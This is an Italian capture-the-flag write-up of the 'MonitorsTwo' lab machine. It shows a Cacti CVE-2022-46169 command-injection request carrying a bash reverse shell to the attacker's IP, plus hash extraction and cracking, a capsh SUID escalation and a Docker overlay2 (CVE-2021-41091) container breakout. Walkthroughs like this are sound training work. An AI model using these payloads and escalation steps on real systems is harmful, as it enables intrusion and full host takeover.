+++
date = '2026-08-20T22:49:36+02:00'
draft = false
title = 'MonitorsTwo Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`22/08/2026`**

![pwn.png](/images/imgs_monitors2/pwn.png)

---
# Introduzione

**_MonitorsTwo_** è il sequel di **_Monitors_**, una macchina **Linux** di difficoltà **Easy** che mantiene il focus su **Cacti** e **Docker** ma con un'exploitation chain decisamente più lineare.

L'initial foothold sfrutta una **Command Injection** non autenticata su **Cacti**, che ci fornisce l'accesso all'interno di un container. Dopo aver enumerato il database ed estratto le credenziali per ottenere una sessione **SSH** sull'host, la privilege escalation richiede un doppio passaggio: prima ottenere **root** all'interno del container sfruttando un **SUID** binary anomalo, e poi evadere dal container abusando della **CVE-2021-41091**, che affligge le directory **overlay2** di **Docker**.

---
# Tecniche Utilizzate

- **Cacti Unauthenticated Command Injection (CVE-2022-46169)**

- **Metasploit for Debugging & Param Enumeration**

- **Database Credential Extraction & Cracking**

- **Docker Container Root via SUID (capsh)**

- **Moby/Docker Overlay2 Privilege Escalation (CVE-2021-41091)**

---
# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- monitors2
```
```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV monitors2
```

```text
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
179/tcp  filtered bgp
9502/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Porte Aperte**:

- **22**/tcp - SSH

- **80**/tcp - HTTP

## Enumerazione Web

Sul web server era hostata un'instanza di **Cacti** con il relativo login. Versione: **`1.2.22`**

![web1.png](/images/imgs_monitors2/web1.png)

Ho subito cercato vulnerabilità note:

```bash
searchsploit cacti 1.2.22
```

![scsploit1.png](/images/imgs_monitors2/scsploit1.png)

**CVE-2022-46169**.

**Note**: _Una **Unauthenticated Command Injection**. Per sfruttarla, un attaccante deve bypassare il controllo di autorizzazione (spesso falsificando l'header **`X-Forwarded-For`** con l'IP locale) e iniettare comandi tramite il parametro **`poller_id`** dell'endpoint **`remote_agent.php`**._

---
# Accesso Iniziale | Cacti Command Injection (Manual)

Ho trovato uno script pubblico per questa vulnerabilità, ma per qualche motivo non funzionava. Lo script effettuava un bruteforce sui parametri **`host_id`** e **`local_data_ids`** in un range da **0** a **100**. 

![script.png](/images/imgs_monitors2/script.png)

Ho provato a giocare con quei parametri, ma non capivo esattamente cosa stesse fallendo e non riuscivo a ottenere una shell.

Ho cercato altri **PoC**, ma nessuno di questi ha funzionato o aggiungeva qualcosa di nuovo. Tuttavia, ho letto di un modulo **Metasploit** dedicato.
Ho avviato **msfconsole** e l'ho cercato:

```bash
exploit(linux/http/cacti_unauthenticated_cmd_injection)
```

L'ho settato e lanciato. Mi ha restituito una shell, ma cosa ancora più importante, ha rivelato esattamente dove veniva triggerata la vulnerabilità, fornendomi i parametri corretti: **`host_id=1`** and **`local_data_id[]=6`**.

![msf.png](/images/imgs_monitors2/msf.png)

Dato che preferisco fare le cose manualmente e specialmente perché mi sto preparando per la certificazione **OSCP**, ho chiuso la sessione **Metasploit** e sono tornato su **Burp Suite**.

Ho impostato il mio listener:

```bash
nc -lvnp 22667
```

E ho inviato questa richiesta **HTTP**:

```text
GET /remote_agent.php?action=polldata&local_data_ids[]=6&host_id=1&poller_id=1%3bbash+-c+'bash+-i+>%26+/dev/tcp/10.10.15.152/22667+0>%261' HTTP/1.1
Host: monitors2
X-Forwarded-For: 127.0.0.1
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

![burp1.png](/images/imgs_monitors2/burp1.png)

Ho ottenuto una shell come **www-data** all'interno di un container **Docker**.

![initial_access.png](/images/imgs_monitors2/initial_access.png)

---
# Lateral Movement | DB Enumeration to SSH

Come sono solito fare quando ottengo l'accesso a un web server, ho puntato al database. Avendo appena pwnato la prima macchina **_Monitors_**, sapevo esattamente dove **Cacti** memorizza la configurazione del suo **DB**:

```bash
cat include/config.php
```

![db_conf.png](/images/imgs_monitors2/db_conf.png)

Ho provato a connettermi al **DB**, ma il prompt continuava a caricare all'infinito. Il problema era la mia shell, che non era completamente interattiva. Ho provato a fare l'upgrade usando **Python**, ma non era installato in questo container.

Così, ho usato il comando **script** per aggirare il problema:

```bash
script /dev/null -c bash
```

Dopodiché, mi sono connesso a **MySQL**:

```bash
mysql -h db -u root -p
```

E ho recuperato gli hash degli utenti **admin** e **marcus**:

```sql
show databases;
use cacti;
show tables;
select * from user_auth;
```

![hash.png](/images/imgs_monitors2/hash.png)

Li ho salvati in un file di testo e li ho dati in pasto a **John The Ripper**:

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![john.png](/images/imgs_monitors2/john.png)

Mi sono connesso via **SSH** alla macchina host e ho preso la **user flag**.

```bash
cat user.txt
```

![lateral.png](/images/imgs_monitors2/lateral.png)

---
# Privilege Escalation | Container Breakout via Overlay2

Subito dopo aver effettuato l'accesso **SSH** sulla macchina, il **MOTD** (**Message of the Day**) suggeriva che l'utente **marcus** avesse delle email.

Ho controllato la posta:

```bash
ls -lha /var/spool/mail
cat /var/spool/mail/marcus
```

L'email conteneva un bollettino di sicurezza che menzionava tre vulnerabilità critiche:

- **CVE-2021-33033 (Linux kernel before 5.11.14)**

- **CVE-2020-25706 (Cacti XSS)**

- **CVE-2021-41091 (Moby / Docker Engine overlay2 permissions)**

Dato che avevo già accesso ad un container e la prima macchina (**_Monitors_**) trattava una tecnica di container breakout, ho deciso di analizzare per prima l'ultima **CVE**.

- **Fonte**: https://github.com/UncleJ4ck/CVE-2021-41091

**Nota**: _**La CVE-2021-41091** è una vulnerabilità che permette agli utenti **Linux** non privilegiati di attraversare ed eseguire programmi all'interno della directory dei dati di **Docker** (**`overlay2`**) a causa di permessi non sufficientemente restrittivi. In parole povere: se riusciamo a piazzare un binario **SUID** all'interno del container, possiamo navigare dal file system dell'host fino alla cartella fisica di quel container ed eseguirlo per diventare **root** sull'host._

Per testarla, ho creato un file fittizio all'interno della directory **`/tmp`** del container **Docker**. Dalla shell di **marcus**, ho usato **`findmnt`** per rivelare il path fisico del container, e un **`ls -lha`** ha confermato la presenza del file appena creato. La vulnerabilità era confermata.

![conts.png](/images/imgs_monitors2/conts.png)

Il problema ora era che dovevo elevare i privilegi all'interno del container **Docker** per poter impostare i permessi **SUID** su un file.
Ho iniziato l'enumerazione manuale all'interno del container, cercando tra i **SUID** binary:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![capsh.png](/images/imgs_monitors2/capsh.png)

Ho trovato un binario non standard: **`capsh`**.
Cercando su **GTFOBins**, ho trovato l'esatto payload per lo sfruttamento:

- **Fonte**: https://gtfobins.org/gtfobins/capsh/#shell

```bash
capsh --gid=0 --uid=0 --
```

Ora ero **root** sul container.

![root_cont.png](/images/imgs_monitors2/root_cont.png)

Successivamente, dovevo preparare la trappola per l'host. Ho copiato il binario **`/bin/bash`** nella directory **`/tmp`** del container, ho cambiato il proprietario in **root** e gli ho assegnato i permessi **SUID**:

```bash
cp /bin/bash /tmp
chown root:root bash
chmod 4755 bash
```

Tornando alla mia shell **SSH** sull'host (utente **marcus**), ho navigato all'interno della directory **overlay2 merged** del container e ho eseguito **bash**:

```bash
cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp
./bash -p
```

![rootf.png](/images/imgs_monitors2/rootf.png)

**Pwned**.

---
# Considerazioni Finali

Penso che classificare questa macchina come **Easy** sia la scelta corretta. Ha sicuramente molti step per essere una macchina facile, ma tecnicamente nessuno di questi è eccessivamente complesso. È un box ottimo per mettere mano ai file system di **Docker**, ai binari **SUID** e per allenare la mentalità di sfruttare manualmente le vulnerabilità quando gli script automatici falliscono.

**Fonti**:

- **GTFOBins capsh | https://gtfobins.org/gtfobins/capsh/#shell**

- **CVE-2021-41091 PoC (UncleJ4ck) | https://github.com/UncleJ4ck/CVE-2021-41091**

